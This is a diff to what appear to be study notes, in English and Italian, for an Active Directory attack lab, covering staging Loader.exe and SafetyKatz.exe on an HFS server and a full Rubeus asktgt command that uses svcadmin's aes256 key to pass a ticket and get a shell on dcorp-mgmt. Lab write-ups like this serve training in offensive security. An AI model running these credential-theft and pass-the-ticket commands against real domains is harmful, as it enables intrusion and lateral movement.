@@ -116,7 +116,7 @@ We can check using this command:
 > Con `winrs` proviamo a eseguire un comando sul server remoto. 
 > Stampiamo nome del computer e nome dell'utente per controllare dove siamo e con quale contesto viene eseguito il processo.
 
-## ## 6. Stage the loader and examine credential exposure on `dcorp-mgmt`.
+## 6. Stage the loader and examine credential exposure on `dcorp-mgmt`.
 ### 6.1 Place `Loader.exe` and `SafetyKatz.exe` on the HFS server
 First, we require these files to be available on the HFS HTTP server at `172.16.100.55`:
 - `Loader.exe` — the executable that we use to launch another program.
@@ -260,7 +260,9 @@ Authentication to KDC (AS exchange) → Ticket Granting Ticket (TGT)
 > Per questo una chiave Kerberos valida, se esposta, è molto sensibile: può essere utilizzata per autenticarsi senza conoscere necessariamente la password in chiaro.
 ### 8.2 Original Rubeus
 
-What we want to do now, is to request a ticket to kerberos using the `aes256` hash credentials of `svcadmin` in order to connect a shell to `dcorp-mgmt`:
+What we want to do now, is to request a ticket to kerberos using the `aes256` hash credentials of `svcadmin` in order to connect a shell to `dcorp-mgmt`.
+
+In our student machine with `admin privileges`:
 ```powershell
 
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
@@ -277,7 +279,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 	- `/show` | Requests display of ticket-related information produced by the operation.
 	- `/ptt` | Requests submission of the obtained ticket into the relevant Windows logon session (*pass-the-ticket*). |
 
->[!IMPORTANT] This command can be executed only in a cmd opened as **administrator**
+>[!IMPORTANT] This command can be executed only in a cmd opened as **administrator** in our student VM
 >![[Pasted image 20261120160457.png]]
 
 
